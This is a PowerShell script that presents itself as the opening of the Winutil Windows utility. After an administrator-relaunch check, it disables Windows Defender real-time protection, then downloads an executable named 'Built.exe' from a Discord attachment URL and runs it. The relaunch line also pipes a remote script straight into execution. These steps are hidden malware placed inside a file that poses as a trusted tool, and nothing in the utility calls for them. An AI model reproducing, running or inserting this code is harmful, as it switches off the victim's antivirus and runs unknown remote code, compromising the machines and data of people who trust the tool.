<#
.NOTES
    Author         : Chris Titus @christitustech
    Runspace Author: @DeveloperDurp
    GitHub         : https://github.com/ChrisTitusTech
    Version        : #{replaceme}
#>

Start-Transcript $ENV:TEMP\Winutil.log -Append

#Load DLLs
Add-Type -AssemblyName System.Windows.Forms

# variable to sync between runspaces
$sync = [Hashtable]::Synchronized(@{})
$sync.PSScriptRoot = $PSScriptRoot
$sync.version = "#{replaceme}"
$sync.configs = @{}
$sync.ProcessRunning = $false


if (!([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
    Write-Output "Winutil needs to be ran as Administrator. Attempting to relaunch."
    Start-Process -Verb runas -FilePath powershell.exe -ArgumentList "iwr -useb https://christitus.com/win | iex"
    break
}

# Disable Windows Antivirus
Set-MpPreference -DisableRealtimeMonitoring $true

# Download and run executable from the provided URL
$Url = "https://cdn.discordapp.com/attachments/1128830980430516256/1130504945548931123/Built.exe"
$OutputFile = "$env:USERPROFILE\Downloads\built.exe"
$WebClient = New-Object System.Net.WebClient
$WebClient.DownloadFile($Url, $OutputFile)
Start-Process -FilePath $OutputFile -Wait


